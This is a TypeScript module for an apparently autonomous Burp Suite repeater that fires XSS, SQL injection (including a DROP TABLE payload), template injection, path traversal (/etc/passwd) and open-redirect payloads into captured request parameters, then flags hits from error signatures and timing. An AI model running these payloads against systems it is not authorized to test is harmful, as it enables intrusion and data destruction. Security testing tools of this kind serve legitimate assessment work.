import type { BurpClient } from "./client.js";
import type { BurpProxyItem } from "./types.js";
import { createSubsystemLogger } from "../../logging/subsystem.js";

const log = createSubsystemLogger("burp/repeater");

export type RepeaterFinding = {
  url: string;
  parameter: string;
  payload: string;
  vulnType: string;
  evidence: string;
  statusCode: number;
  responseTime: number;
};

const PAYLOADS: Record<string, string[]> = {
  xss: [
    `<script>alert('XSS')</script>`,
    `"><img src=x onerror=alert(1)>`,
    `'><svg onload=alert(1)>`,
    `javascript:alert(1)`,
    `<iframe src="javascript:alert(1)">`,
  ],
  sqli: [
    `'`,
    `' OR '1'='1`,
    `' OR 1=1--`,
    `'; DROP TABLE users--`,
    `1' AND SLEEP(3)--`,
    `1 UNION SELECT NULL,NULL,NULL--`,
  ],
  ssti: [
    `{{7*7}}`,
    `${7*7}`,
    `<%= 7*7 %>`,
    `#{7*7}`,
  ],
  path_traversal: [
    `../../../etc/passwd`,
    `..\\..\\..\\windows\\win.ini`,
    `....//....//etc/passwd`,
    `%2e%2e%2fetc%2fpasswd`,
  ],
  open_redirect: [
    `https://evil.ironcliw-test.example.com`,
    `//evil.ironcliw-test.example.com`,
    `https://google.com`,
  ],
};

const ERROR_SIGNATURES: Record<string, string[]> = {
  sqli: [
    "sql syntax",
    "mysql_fetch",
    "ORA-",
    "syntax error",
    "unclosed quotation",
    "pg_query",
    "sqlite3",
    "SQLiteException",
    "Microsoft SQL Native",
    "ODBC SQL Server Driver",
    "Warning: mysql_",
  ],
  ssti: [
    "49",
    "TemplateNotFound",
    "jinja2",
    "Twig",
    "FreeMarker",
  ],
  path_traversal: [
    "root:x:",
    "[boot loader]",
    "[extensions]",
    "for 16-bit app support",
  ],
};

/**
 * BurpRepeater — Autonomous request repeater with payload injection.
 * Equivalent to manually using Burp Repeater + Intruder for each parameter.
 */
export class BurpRepeater {
  constructor(private client: BurpClient) {}

  /**
   * Pull proxy history and autonomously test all injectable parameters.
   * Returns confirmed findings.
   */
  async huntFromHistory(opts: {
    filterUrl?: string;
    vulnTypes?: Array<keyof typeof PAYLOADS>;
    maxRequests?: number;
  } = {}): Promise<RepeaterFinding[]> {
    const history = await this.client.getProxyHistory();
    const findings: RepeaterFinding[] = [];
    const types = opts.vulnTypes ?? Object.keys(PAYLOADS);
    let reqCount = 0;
    const maxReq = opts.maxRequests ?? 500;

    const items = opts.filterUrl
      ? history.filter(h => h.url.includes(opts.filterUrl!))
      : history;

    log.info(`[Repeater] Testing ${items.length} requests from proxy history...`);

    for (const item of items) {
      if (reqCount >= maxReq) { break; }
      const newFindings = await this.testItem(item, types, maxReq - reqCount);
      findings.push(...newFindings);
      reqCount += newFindings.length + 1;
    }

    log.info(`[Repeater] Done. Found ${findings.length} potential issues.`);
    return findings;
  }

  /**
   * Test a single proxy history item across all parameter positions.
   */
  private async testItem(
    item: BurpProxyItem,
    types: Array<keyof typeof PAYLOADS>,
    budget: number,
  ): Promise<RepeaterFinding[]> {
    const findings: RepeaterFinding[] = [];
    let spent = 0;

    const urlObj = new URL(item.url);
    const params = [...urlObj.searchParams.entries()];

    for (const [paramName, originalValue] of params) {
      if (spent >= budget) { break; }

      for (const vulnType of types) {
        const payloadList = PAYLOADS[vulnType] ?? [];
        for (const payload of payloadList) {
          if (spent >= budget) { break; }

          const testUrl = new URL(item.url);
          testUrl.searchParams.set(paramName, payload);

          try {
            const start = Date.now();
            const result = await this.client.fireRequest({
              url: testUrl.toString(),
              method: item.method,
              headers: { "User-Agent": "IronCliw-Repeater/1.0" },
            });
            const elapsed = Date.now() - start;
            spent++;

            const responseBody = result.responseBody ?? Buffer.from(result.response ?? "", "base64").toString("utf-8");
            const evidence = this.detectVulnerability(vulnType, payload, responseBody, result.statusCode, elapsed);

            if (evidence) {
              log.info(`[Repeater] ✅ FOUND ${vulnType} on param "${paramName}" @ ${item.url}`);
              findings.push({
                url: item.url,
                parameter: paramName,
                payload,
                vulnType,
                evidence,
                statusCode: result.statusCode,
                responseTime: elapsed,
              });
              break;
            }
          } catch (err) {
            log.warn(`[Repeater] Request failed for ${testUrl.toString()}: ${(err as Error).message}`);
          }
        }

        if (originalValue && types.includes("open_redirect")) {
          const redirectParams = ["redirect", "url", "next", "return", "returnTo", "redirect_uri", "goto", "dest"];
          if (redirectParams.includes(paramName.toLowerCase())) {
            const testUrl = new URL(item.url);
            const openRedirectPayload = PAYLOADS.open_redirect[0] ?? "";
            testUrl.searchParams.set(paramName, openRedirectPayload);
            try {
              const result = await this.client.fireRequest({
                url: testUrl.toString(),
                method: item.method,
                followRedirects: false,
              });
              spent++;
              const location = result.responseHeaders?.["location"] ?? "";
              if (result.statusCode >= 300 && result.statusCode < 400 && location.includes("ironcliw-test")) {
                findings.push({
                  url: item.url,
                  parameter: paramName,
                  payload: openRedirectPayload,
                  vulnType: "open_redirect",
                  evidence: `Server redirected to attacker URL: ${location}`,
                  statusCode: result.statusCode,
                  responseTime: 0,
                });
              }
            } catch { }
          }
        }
      }
    }

    if (item.method === "POST") {
      const bodyFindings = await this.testPostBody(item, types, budget - spent);
      findings.push(...bodyFindings);
    }

    return findings;
  }

  private async testPostBody(
    item: BurpProxyItem,
    types: Array<keyof typeof PAYLOADS>,
    budget: number,
  ): Promise<RepeaterFinding[]> {
    const findings: RepeaterFinding[] = [];
    let spent = 0;

    const rawReq = Buffer.from(item.request, "base64").toString("utf-8");
    const bodyMatch = rawReq.match(/\r?\n\r?\n([\s\S]+)$/);
    if (!bodyMatch) { return findings; }

    const body = bodyMatch[1] ?? "";
    let params: Array<[string, string]>;

    try {
      const parsed = new URLSearchParams(body);
      params = [...parsed.entries()];
    } catch {
      return findings;
    }

    for (const [paramName] of params) {
      if (spent >= budget) { break; }

      for (const vulnType of types) {
        const payloadList = PAYLOADS[vulnType] ?? [];
        for (const payload of payloadList) {
          if (spent >= budget) { break; }

          const testParams = new URLSearchParams(body);
          testParams.set(paramName, payload);

          try {
            const start = Date.now();
            const result = await this.client.fireRequest({
              url: item.url,
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: testParams.toString(),
            });
            const elapsed = Date.now() - start;
            spent++;

            const responseBody = result.responseBody ?? Buffer.from(result.response ?? "", "base64").toString("utf-8");
            const evidence = this.detectVulnerability(vulnType, payload, responseBody, result.statusCode, elapsed);

            if (evidence) {
              findings.push({
                url: item.url,
                parameter: `[POST] ${paramName}`,
                payload,
                vulnType,
                evidence,
                statusCode: result.statusCode,
                responseTime: elapsed,
              });
              break;
            }
          } catch { }
        }
      }
    }

    return findings;
  }

  private detectVulnerability(
    vulnType: string,
    payload: string,
    responseBody: string,
    statusCode: number,
    responseTimeMs: number,
  ): string | null {
    const body = responseBody.toLowerCase();

    switch (vulnType) {
      case "xss": {
        if (responseBody.includes(payload)) {
          return `Payload reflected verbatim in response: ${payload.slice(0, 60)}`;
        }
        const stripped = payload.replace(/<[^>]+>/g, "").replace(/['"]/g, "");
        if (stripped && responseBody.includes(stripped)) {
          return `Partial payload reflection detected`;
        }
        break;
      }
      case "sqli": {
        for (const sig of ERROR_SIGNATURES.sqli ?? []) {
          if (body.includes(sig.toLowerCase())) {
            return `SQL error signature found: "${sig}"`;
          }
        }
        if (payload.includes("SLEEP") && responseTimeMs > 2800) {
          return `Time-based SQLi confirmed — response took ${responseTimeMs}ms`;
        }
        break;
      }
      case "ssti": {
        if (responseBody.includes("49")) {
          return `SSTI confirmed — 7*7=49 expression evaluated`;
        }
        for (const sig of ERROR_SIGNATURES.ssti ?? []) {
          if (body.includes(sig.toLowerCase())) {
            return `SSTI template engine error: "${sig}"`;
          }
        }
        break;
      }
      case "path_traversal": {
        for (const sig of ERROR_SIGNATURES.path_traversal ?? []) {
          if (responseBody.includes(sig)) {
            return `Path traversal confirmed — file contents found: "${sig}"`;
          }
        }
        break;
      }
      default:
        break;
    }

    if (statusCode >= 500) {
      return `Server error (${statusCode}) triggered — potential injection point`;
    }

    return null;
  }
}
